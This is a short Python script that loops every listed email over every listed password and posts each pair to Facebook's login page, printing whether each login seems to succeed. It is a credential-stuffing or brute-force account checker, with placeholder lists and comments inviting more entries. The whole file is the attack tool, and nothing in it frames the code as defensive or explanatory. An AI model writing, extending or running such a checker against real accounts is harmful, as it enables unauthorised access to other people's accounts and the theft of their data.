import requests

def check_facebook_login(email, password):
    url = 'https://www.facebook.com/login.php'
    data = {
        'email': email,
        'pass': password
    }

    response = requests.post(url, data=data)

    if 'Log into Facebook' in response.text:
        print(f"Login failed for email: {email}")
    else:
        print(f"Login successful for email: {email}")

def main():
    emails = [
        'email1@example.com',
        'email2@example.com',
        # Add more emails here
    ]
    passwords = [
        'password1',
        'password2',
        # Add more passwords here
    ]

    for email in emails:
        for password in passwords:
            check_facebook_login(email, password)

if __name__ == "__main__":
    main()
